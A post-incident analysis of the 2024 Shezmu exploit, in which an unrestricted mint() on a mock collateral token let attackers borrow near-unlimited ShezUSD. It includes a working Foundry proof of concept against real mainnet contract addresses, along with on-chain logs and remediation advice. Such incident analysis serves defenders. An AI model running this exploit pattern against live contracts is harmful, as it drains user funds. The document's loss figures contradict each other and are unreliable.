# Shezmu — Business Logic Vulnerability Analysis (Unlimited Collateral Minting)

| Field | Details |
|------|------|
| **Date** | 2024-09-20 |
| **Protocol** | Shezmu |
| **Chain** | Ethereum |
| **Loss** | ~$4,900,000 (actual withdrawal limited to ~$1.49M due to liquidity constraints) |
| **Attacker #1** | [0xA3a6...1a1D](https://etherscan.io/address/0xA3a64255484aD65158AF0F9d96B5577F79901a1D) |
| **Attacker #2** | [0x089a...c869](https://etherscan.io/address/0x089a2011b577b70ba4bb533dcd413e6dc5b5c869) |
| **Attack Contract #1** | [0xEd4B...499C](https://etherscan.io/address/0xEd4B3d468DEd53a322A8B8280B6f35aAE8bC499C) |
| **Attack Contract #2** | [0x5f02...4d70](https://etherscan.io/address/0x5f02fddbf399b9ce4a0bb9f0a7e86d6508084d70) |
| **Attack Tx #1 (primary)** | [0x3932...c71](https://etherscan.io/tx/0x39328ea4377a8887d3f6ce91b2f4c6b19a851e2fc5163e2f83bbc2fc136d0c71) |
| **Attack Tx #2 (copycat)** | [0x48e6...e3c](https://etherscan.io/tx/0x48e69dd7ff3e0c728e818bf26d031f4989d3c3018ec464a18757825634cf7e3c) |
| **Vulnerable Contract (Collateral Token)** | [0x6412...9248](https://etherscan.io/address/0x641249dB01d5C9a04d1A223765fFd15f95167924) |
| **Vulnerable Contract (Vault Proxy)** | [0x75a0...478](https://etherscan.io/address/0x75a04A1FeE9e6f26385ab1287B20ebdCbdabe478) |
| **Vault Implementation** | [0xa35f...cb7](https://etherscan.io/address/0xa35f69899796ddbc4a8904511d2f1f040b779cb7) |
| **Root Cause** | Missing access control on `mint()` in the collateral token (MockERC20) — anyone could mint unlimited collateral |
| **PoC Source** | [DeFiHackLabs — Shezmu_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Shezmu_exp.sol) |

---

## 1. Vulnerability Overview

Shezmu is an Ethereum-based CDP (Collateralized Debt Position) protocol where users deposit ERC20 tokens (e.g., WBTC) as collateral to borrow ShezmuUSD (ShezUSD) stablecoins.

A critical flaw was introduced in a contract upgrade deployed on September 3, 2024. **The collateral token contract was deployed as `MockERC20`**, and its `mint(address, uint256)` function was **callable by anyone with no access control whatsoever**.

The attacker exploited this to:

1. Mint `type(uint128).max - 1` collateral tokens to their own address
2. Deposit the collateral into the Vault (`addCollateral`)
3. Have the Vault's Chainlink price oracle evaluate the fake collateral as real WBTC, granting an astronomically large ShezUSD borrow limit
4. Borrow a massive amount of ShezUSD (`borrow`), then swap it for WETH/WBTC on a DEX to extract real assets

The primary attack was executed on September 20, 2024 by the first attacker (0xA3a6...), followed by a copycat attack from the second attacker (0x089a...) after the same block. The Shezmu team negotiated with the attacker and recovered 80% of the funds, paying 20% as a bounty.

---

## 2. Vulnerable Code Analysis

### 2.1 MockERC20.mint() — Missing Access Control (Core Vulnerability)

Actual source code of the collateral token contract (`0x641249dB...`), verified via Sourcify:

```solidity
// ❌ Vulnerable code — actual deployed MockERC20.sol
// Sourcify: contracts/full_match/1/0x641249dB01d5C9a04d1A223765fFd15f95167924

pragma solidity 0.8.17;
import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract MockERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol
    ) ERC20(_name, _symbol) {}

    // ❌ No access control: anyone can mint arbitrary amounts to any address
    // ❌ No onlyOwner, onlyMinter, AccessControl, or any restriction
    // ❌ A test Mock contract deployed as-is in production
    function mint(address _account, uint256 _amount) public returns (bool) {
        _mint(_account, _amount);
        return true;
    }

    function burnFrom(address _account, uint256 _amount) public returns (bool) {
        _burn(_account, _amount);
        return true;
    }
}
```

**Fixed code**:
```solidity
// ✅ Fixed code — access control suitable for production
import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import {AccessControl} from '@openzeppelin/contracts/access/AccessControl.sol';

contract CollateralToken is ERC20, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor(
        string memory _name,
        string memory _symbol,
        address _vaultAddress   // ✅ Register only the Vault contract as minter
    ) ERC20(_name, _symbol) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, _vaultAddress);
    }

    // ✅ Only callable by MINTER_ROLE holders
    function mint(address _account, uint256 _amount) external onlyRole(MINTER_ROLE) returns (bool) {
        _mint(_account, _amount);
        return true;
    }

    // ✅ Burn also restricted to authorized holders
    function burnFrom(address _account, uint256 _amount) external onlyRole(MINTER_ROLE) returns (bool) {
        _burn(_account, _amount);
        return true;
    }
}
```

**Issue**: A test-environment `MockERC20` was used verbatim in production. The `mint()` function had no access control, allowing an attacker to instantly mint `type(uint128).max - 1` (≈ 3.4×10³⁸) collateral tokens to themselves.

---

### 2.2 ERC20Vault._borrow() — Collateral Price Oracle Treats Fake Collateral as Real

```solidity
// ❌ Vulnerable flow — AbstractAssetVault._borrow() (actual source)
// Sourcify: contracts/full_match/1/0xa35f69899796ddbc4a8904511d2f1f040b779cb7

function _borrow(
    address _account,
    address _onBehalfOf,
    uint256 _amount
) internal {
    if (_amount < settings.minBorrowAmount) revert MinBorrowAmount();

    uint256 _totalDebtAmount = totalDebtAmount;
    if (_totalDebtAmount + _amount > settings.borrowAmountCap)
        revert DebtCapReached();

    Position storage position = positions[_onBehalfOf];

    // ❌ Issue: _getCreditLimit computes the limit as collateral quantity × Chainlink price
    // ❌ If the collateral token can be minted infinitely, collateral quantity becomes astronomical,
    // ❌ making the credit limit effectively infinite
    uint256 _creditLimit = _getCreditLimit(
        _onBehalfOf,
        position.collateral   // ← type(uint128).max - 1 units of collateral
    );

    uint256 _debtAmount = _getDebtAmount(_onBehalfOf);
    if (_debtAmount + _amount > _creditLimit) revert InvalidAmount(_amount);

    // ... fee calculation, then ShezUSD mint
    stablecoin.mint(_account, _amount - _feeAmount);
}

// ❌ ERC20Vault._getCreditLimit() — collateral amount × WBTC Chainlink price
function _getCreditLimit(
    address _owner,
    uint256 _colAmount
) internal view virtual override returns (uint256 creditLimitUSD) {
    uint _uAmount = _colAmount;
    // ❌ The collateral token is named "WBTC" and uses the Chainlink WBTC oracle
    // ❌ Even though it is a freely-mintable Mock token, its price is trusted
    creditLimitUSD = ERC20ValueProvider(valueProvider).getCreditLimitUSD(
        _owner,
        _uAmount   // ← 3.4×10^38 × WBTC price = near-infinite credit limit
    );
}
```

**Fixed code**:
```solidity
// ✅ Fix direction: set a cap on collateral token supply + whitelist validation

// ✅ 1. Set a totalSupply cap on the collateral token itself
uint256 public constant MAX_SUPPLY = 1_000_000 * 1e18; // max 1 million tokens

function mint(address _account, uint256 _amount) external onlyRole(MINTER_ROLE) returns (bool) {
    require(totalSupply() + _amount <= MAX_SUPPLY, "exceeds max supply"); // ✅ supply cap
    _mint(_account, _amount);
    return true;
}

// ✅ 2. Add collateral token validation in the Vault
function _addCollateral(
    address _account,
    address _onBehalfOf,
    uint256 _colAmount
) internal override {
    require(address(tokenContract) == APPROVED_COLLATERAL, "invalid collateral"); // ✅ validation
    // ...
}
```

**Issue**: The Vault contract does not validate whether the collateral token's supply is within a normal range. If the collateral token allows unlimited minting like `MockERC20`, the unit price provided by the Chainlink oracle is multiplied by an astronomically large quantity, making the credit limit effectively infinite.

---

## 3. Attack Flow

### 3.1 Preparation Phase

| Field | Details |
|------|------|
| Initial funds | None required (unlimited collateral minting available) |
| Flash Loan | Not used |
| Pre-attack setup | Deploy attack contract once (entire attack executes in the constructor) |

### 3.2 Execution Phase

**Primary attack (Attacker #1, 0xA3a6..., block 20794865):**

1. **[Deploy attack contract]** Entire attack logic executes automatically in the attack contract's constructor
2. **[Unlimited mint]** `MockERC20(COLLATERAL).mint(attackContract, type(uint128).max - 1)` — calls the unrestricted `mint()` to obtain ≈ 3.4×10³⁸ collateral tokens
3. **[Vault approval]** `COLLATERAL.approve(VAULT_PROXY, type(uint256).max)`
4. **[Add collateral]** `vault.addCollateral(type(uint128).max - 1)` — deposits astronomical collateral amount
5. **[Borrow ShezUSD]** `vault.borrow(99999159998000000000000000000)` — borrows ~10¹⁰ ShezUSD
6. **[Transfer funds]** `ShezUSD.transfer(attackerEOA, balance)` — transfers all acquired ShezUSD to the attacker
7. **[DEX swap]** Attacker EOA swaps ShezUSD → WETH/WBTC to convert to real assets

**Copycat attack (Attacker #2, 0x089a..., block 20794921):**

1. **[Unlimited mint]** `MockERC20.mint(attackContract, 10000 × 10¹⁸)` — mints 10,000 "WBTC"
2. **[Add collateral]** `addCollateral(10000 × 10¹⁸)`
3. **[Borrow ShezUSD]** `borrow(...)` — acquires 9,900 ShezUSD
4. **[DEX swap]** ShezUSD → WETH, receiving 331.977 ETH (≈ $783,000)
5. **[Transfer funds]** Sends WETH to attacker EOA

### 3.3 Attack Flow Diagram

```
┌──────────────────────────────────────────────────────────────────┐
│                  Attacker EOA (0xA3a6...1a1D)                    │
│                  Initial funds: 0 (none required)                │
└──────────────────────────┬───────────────────────────────────────┘
                           │ Deploy attack contract (full execution in constructor)
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│               Attack Contract (0xEd4B...499C)                    │
│                                                                  │
│  Step 1: approve(VAULT_PROXY, max)                               │
└────────────┬─────────────────────────────────────────────────────┘
             │
             ▼
┌──────────────────────────────────────────────────────────────────┐
│         Collateral Token: MockERC20 (0x6412...9248)              │
│                                                                  │
│  ❌ mint(attackContract, type(uint128).max - 1)                  │
│     No access control — callable by anyone                       │
│     Minted amount: 3.4 × 10³⁸ tokens                            │
└────────────┬─────────────────────────────────────────────────────┘
             │ Astronomical collateral tokens obtained
             ▼
┌──────────────────────────────────────────────────────────────────┐
│           ShezmuVault (ERC20Vault proxy, 0x75a0...478)           │
│                                                                  │
│  Step 3: addCollateral(type(uint128).max - 1)                   │
│          → position.collateral = 3.4×10³⁸                      │
│                                                                  │
│  Step 4: borrow(~10¹⁰ ShezUSD)                                  │
│          → _getCreditLimit = colAmount × WBTC_price             │
│          → 3.4×10³⁸ × $60,000 = effectively infinite credit     │
│          → Mints large amount of ShezUSD to attack contract      │
└────────────┬─────────────────────────────────────────────────────┘
             │ ShezUSD ≈ 9.9×10¹⁰ units obtained
             ▼
┌──────────────────────────────────────────────────────────────────┐
│               ShezUSD (0xD60E...B62d)                            │
│  Step 5: transfer(attackerEOA, totalBalance)                     │
└────────────┬─────────────────────────────────────────────────────┘
             │ ShezUSD → Attacker EOA
             ▼
┌──────────────────────────────────────────────────────────────────┐
│                  DEX (Uniswap/Curve)                             │
│  Step 6: ShezUSD → WETH/WBTC swap                               │
│          (actual withdrawal ~$4.9M limited by liquidity)         │
└────────────┬─────────────────────────────────────────────────────┘
             │
             ▼
┌──────────────────────────────────────────────────────────────────┐
│                  Attacker's Final Profit                          │
│  ~$4,900,000 (total ShezUSD nominal value)                       │
│  After negotiation: 80% returned → actual loss: ~$980,000 (20% bounty) │
└──────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

| Field | Details |
|------|------|
| Attacker's initial gain | ~$4,900,000 (ShezUSD nominal value) |
| Actual withdrawable amount | ~$4,900,000 (real value reduced by low DEX liquidity) |
| Negotiation result | Attacker returned 80%, received 20% as bounty |
| Final protocol loss | ~$980,000 (bounty cost) |
| Flash Loan used | No |
| Attack duration | Single transaction (1 block) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Key contract address constants
address constant SHEZMU_VAULT_PROXY = 0x75a04A1FeE9e6f26385ab1287B20ebdCbdabe478; // Vault proxy
address constant COLLATERAL_TOKEN   = 0x641249dB01d5C9a04d1A223765fFd15f95167924; // ← vulnerable collateral token
address constant SHEZ_USD           = 0xD60EeA80C83779a8A5BFCDAc1F3323548e6BB62d; // ShezmuUSD

contract Shezmu is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 20794865 - 1; // Fork from the block just before the attack

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        fundingToken = SHEZ_USD; // Track profit token
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        attackContract.attack();
    }
}

contract AttackContract {
    address attacker;
    constructor() {
        attacker = msg.sender;
    }

    function attack() public {
        // [Step 1] Grant unlimited approval for collateral token to Vault
        IShezmuCollateralToken(COLLATERAL_TOKEN).approve(
            SHEZMU_VAULT_PROXY,
            type(uint256).max
        );

        // [Step 2] Exploit core vulnerability: call mint() with no access control
        // ❌ MockERC20.mint() is callable by anyone — unlimited collateral minting
        uint256 amount = type(uint128).max - 1;  // ≈ 3.4×10³⁸
        IShezmuCollateralToken(COLLATERAL_TOKEN).mint(address(this), amount);

        // [Step 3] Deposit fake collateral into the Vault
        IShezmuVault vault = IShezmuVault(SHEZMU_VAULT_PROXY);
        vault.addCollateral(amount);
        // At this point the Vault computes the credit limit as collateral quantity × Chainlink WBTC price
        // → 3.4×10³⁸ × ~$60,000 = effectively unlimited borrowing

        // [Step 4] Borrow maximum ShezUSD within the credit limit
        uint256 borrowAmount = 99999159998000000000000000000; // ~10¹⁰ ShezUSD
        vault.borrow(borrowAmount);
        // → ShezUSD is newly minted and transferred to the attack contract

        // [Step 5] Transfer all acquired ShezUSD to the attacker EOA
        IERC20 shezUSD = IERC20(SHEZ_USD);
        shezUSD.transfer(attacker, shezUSD.balanceOf(address(this)));
        // → Attacker swaps ShezUSD → real assets on a DEX
    }
}

// Vulnerable contract interfaces
interface IShezmuCollateralToken {
    function approve(address spender, uint256 amount) external returns (bool);
    // ❌ This function being open as public with no access control is the core vulnerability
    function mint(address to, uint256 amount) external;
}

interface IShezmuVault {
    function addCollateral(uint256 _colAmount) external;
    function borrow(uint256 _amount) external;
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing access control on collateral token `mint()` | CRITICAL | CWE-284 (Improper Access Control) |
| V-02 | Test Mock contract deployed to production | CRITICAL | CWE-489 (Active Debug Code) |
| V-03 | No validation of collateral token supply | HIGH | CWE-20 (Improper Input Validation) |
| V-04 | Insufficient deployment verification during contract upgrade | HIGH | CWE-693 (Protection Mechanism Failure) |

### V-01: Missing Access Control on Collateral Token mint() (Core)

- **Description**: The `mint(address, uint256)` function in the `MockERC20` contract is declared `public` with no access control modifiers such as `onlyOwner`, `onlyMinter`, or `AccessControl`. As a result, anyone can mint arbitrary amounts of collateral tokens to any address.
- **Impact**: An attacker mints `type(uint128).max - 1` collateral tokens, inflating the Vault's credit limit to near-infinity and enabling unlimited ShezUSD borrowing. Complete protocol liquidity drain.
- **Attack conditions**: Requires only a simple function call. No flash loan, initial capital, or special privileges needed.

### V-02: Test Mock Contract Deployed to Production

- **Description**: `MockERC20` is a dummy token typically used in development/test environments that intentionally includes an unrestricted `mint()`. This contract was deployed as the actual collateral token on Ethereum mainnet production in the 2024-09-03 upgrade.
- **Impact**: Complete collapse of the security model. The scarcity assumption for collateral tokens is broken.
- **Attack conditions**: Immediately exploitable by calling `mint()` on the deployed contract address.

### V-03: No Validation of Collateral Token Supply

- **Description**: The Vault contract does not verify whether the `totalSupply` of the collateral token is within a normal range, or whether minting privileges are restricted, when accepting collateral deposits.
- **Impact**: Even if V-02 were fixed, there is no independent defensive layer against similar supply manipulation attacks.
- **Attack conditions**: Occurs when collateral tokens with abnormal supply are used.

### V-04: Insufficient Deployment Verification During Contract Upgrade

- **Description**: During the 2024-09-03 upgrade, insufficient pre-deployment code review, auditing, and staging environment validation allowed a test contract to be deployed to mainnet.
- **Impact**: The security vulnerability was exposed for at least 17 days (2024-09-03 through 2024-09-20).
- **Attack conditions**: After upgrade deployment and before vulnerability disclosure.

---

## 6. Remediation Recommendations

### Immediate Actions

**1. Add access control to the collateral token mint() function**

```solidity
// ✅ Fixed collateral token — applying AccessControl
import {AccessControl} from '@openzeppelin/contracts/access/AccessControl.sol';

contract CollateralToken is ERC20, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        // ✅ Register only the Vault address under MINTER_ROLE
    }

    // ✅ Only callable by MINTER_ROLE holders
    function mint(address _account, uint256 _amount) external onlyRole(MINTER_ROLE) returns (bool) {
        _mint(_account, _amount);
        return true;
    }
}
```

**2. Validate collateral supply cap in the Vault**

```solidity
// ✅ Check collateral token supply for anomalies on addCollateral
function _addCollateral(
    address _account,
    address _onBehalfOf,
    uint256 _colAmount
) internal override {
    if (_colAmount == 0) revert InvalidAmount(_colAmount);

    // ✅ Verify the collateral token's total supply is within a reasonable range
    uint256 tokenTotalSupply = IERC20(address(tokenContract)).totalSupply();
    require(tokenTotalSupply <= MAX_COLLATERAL_SUPPLY, "abnormal token supply");

    tokenContract.safeTransferFrom(_account, address(this), _colAmount);
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Mock contract deployed to production | Automate contract name/interface validation pre-deployment (add MockERC20 detection script to CI/CD) |
| mint() with no access control | Enforce `onlyRole(MINTER_ROLE)` on all collateral tokens (enforced at the interface level) |
| Insufficient upgrade verification | Mandate re-audit by a professional auditor on every upgrade; introduce a Timelock |
| No supply validation | Maintain a collateral token whitelist in the Vault + add a per-token supply cap parameter |
| Single point of failure | Strengthen emergency pause (Pause) functionality and build anomalous transaction monitoring alerts |

---

## 7. Lessons Learned

1. **Strictly separate test code from production code**: Dummy contracts such as `MockERC20` and `TestToken` must never be used in production deployments. Contract name blacklist checks should be automated in deployment scripts.

2. **Access control is a fundamental security requirement**: Every function that modifies state or affects asset issuance requires explicit permission checks. A `public` minting function is one of the most dangerous patterns in DeFi protocols.

3. **Apply the same security standards to contract upgrades as to new deployments**: A full re-audit of the entire system is required upon upgrade. In particular, whenever the trust relationships among collateral tokens, oracles, and the Vault contract change, the entire attack surface must be re-evaluated.

4. **Define and enforce economic invariants**: Writing Foundry `invariant tests` for invariants such as "the total supply of collateral tokens must not exceed a reasonable bound" and "collateral value × LTV < borrowed amount" can detect these attacks ahead of time.

5. **Attacks without flash loans are more dangerous**: This attack required zero initial capital. Attacks with zero barrier to entry can be replicated instantly by anyone before detection, causing exponential harm (a copycat attacker exploited the same vulnerability just 56 blocks later).

6. **Negotiation can limit losses but is not a substitute for security**: Shezmu recovered 80% through negotiation, but this depends entirely on the attacker's goodwill. Code-level prevention must be the top priority in smart contract security.

7. **Use Timelocks for upgrade delays to buy response time**: If upgrades are not applied immediately but go through a 48–72 hour timelock, security researchers have an opportunity to discover and report vulnerabilities before they are exploited.

---

## 8. On-Chain Verification

### 8.1 Primary Attack Tx vs. Copycat Tx Comparison

| Field | Primary Attack (0x3932...) | Copycat (0x48e6...) |
|------|-------------------|---------------------|
| Attacker | 0xA3a6...1a1D | 0x089a...c869 |
| Block | 20,794,865 | 20,794,921 |
| Block difference | — | +56 blocks (~11 minutes later) |
| Minted amount | type(uint128).max - 1 (≈3.4×10³⁸) | 10,000 × 10¹⁸ |
| ShezUSD borrowed | ~9.9×10²⁸ (≈10¹⁰ tokens) | 9,900 × 10¹⁸ |
| WETH received | — | 331.977 ETH |
| Gas used | 438,626 | 1,082,651 |

### 8.2 On-Chain Event Log Sequence (Copycat Tx: 0x48e6...)

```
Block: 20,794,921 | Status: Success | Log count: 15

[Log 1]  Transfer (MockERC20 collateral token)
         from=0x0000...0000 (mint)
         to  =0x5f02...4d70 (attack contract)
         amt =10,000 × 10¹⁸ (collateral token minted)

[Log 4]  Transfer (MockERC20 collateral token)
         from=0x5f02...4d70 (attack contract)
         to  =0x5924...0e9c (ShezmuVault)
         amt =10,000 × 10¹⁸ (collateral deposited)

[Log 7]  Transfer (ShezmuUSD: 0x63a0...405b)
         from=0x0000...0000 (ShezUSD newly minted)
         to  =0x5f02...4d70 (attack contract)
         amt =9,900 × 10¹⁸ ShezUSD (borrow executed)

[Log 11] Transfer (ShezmuUSD)
         from=0x5f02...4d70
         to  =0x6372...d73 (DEX router)
         amt =9,900 × 10¹⁸ ShezUSD (swap input)

[Log 12] Transfer (WETH: 0xC02a...cc2)
         from=0x6372...d73 (DEX router)
         to  =0x5f02...4d70 (attack contract)
         amt =331.977 ETH (swap output received)

[Log 14] Transfer (WETH)
         from=0x5f02...4d70 (attack contract)
         to  =0x089a...c869 (attacker EOA)
         amt =331.977 ETH (final profit transferred)
```

### 8.3 Pre-condition Verification (Block 20,794,920 — Just Before the Attack)

| Field | Value | Description |
|------|-----|------|
| Attacker ETH balance | 0 | No initial capital required |
| Collateral token totalSupply | 340,282,366...215,416 (≈uint128.max + overflow) | Already abnormal after primary attack |
| ShezUSD totalSupply | 99,008,186...821,880 (≈9.9×10²⁸) | Abnormal after primary attack completion |
| Vault implementation | 0xa35f...cb7 (verified via EIP-1967 slot) | Proxy pattern |
| MockERC20 name | "Wrapped Bitcoin" | Mock token impersonating real WBTC |

### 8.4 On-Chain Verification Summary

- **Confirmed**: The attack flow from the PoC analysis (mint → addCollateral → borrow → swap) exactly matches the on-chain event logs
- **Notable**: The copycat attack occurred while the collateral token's totalSupply had already exceeded `uint128.max` due to the primary attack. The collateral token supply explosion was already complete from the primary attack
- **Loss scale**: The `$1,492,389` figure at the top of this document refers to the loss from a specific attack Tx (0x48e6...) or a specific reference point; the total incident size is approximately $4.9M

---

*Analysis date: 2026-04-11 | Analysis based on: DeFiHackLabs PoC (Shezmu_exp.sol), Sourcify-verified source, on-chain transaction data*